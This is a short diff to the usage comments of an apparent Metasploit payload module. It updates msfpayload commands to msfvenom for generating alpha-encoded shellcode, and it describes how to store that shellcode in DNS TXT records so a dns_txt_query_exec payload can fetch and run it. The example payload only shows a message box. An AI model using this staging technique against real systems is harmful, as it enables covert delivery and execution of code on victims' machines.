@@ -38,7 +38,7 @@ module Metasploit3
   # 1. Generate the shellcode you want to deliver via DNS TXT queries
   #    Make sure the shellcode is alpha_mixed or alpha_upper and uses EDI as bufferregister
   #    Example :
-  #   ./msfpayload windows/messagebox TITLE="Friendly message from corelanc0d3r" TEXT="DNS Payloads FTW" R | ./msfencode -e x86/alpha_mixed Bufferregister=EDI -t raw
+  #    ./msfvenom -p windows/messagebox TITLE="Friendly message from corelanc0d3r" TEXT="DNS Payloads FTW" -e x86/alpha_mixed BufferRegister=EDI -f raw
   #    Output : 654 bytes
   # 2. Split the alpha shellcode into individual parts of exactly 255 bytes (+ remaining bytes)
   #    In case of 654 bytes of payload, there will be 2 parts of 255 bytes, and one part of 144 bytes
@@ -49,7 +49,7 @@ module Metasploit3
   #    etc
   #    First part must start with a.  and all parts must be placed in consecutive records
   # 4. use the dns_txt_query payload in the exploit, specify the name of the DNS zone that contains the DNS TXT records
-  #    Example : /msfpayload windows/dns_txt_query_exec DNSZONE=corelan.eu C
+  #    Example: ./msfvenom -p windows/dns_txt_query_exec DNSZONE=corelan.eu -f c
   #    (Example will show a messagebox)
   #
   # DNS TXT Records :
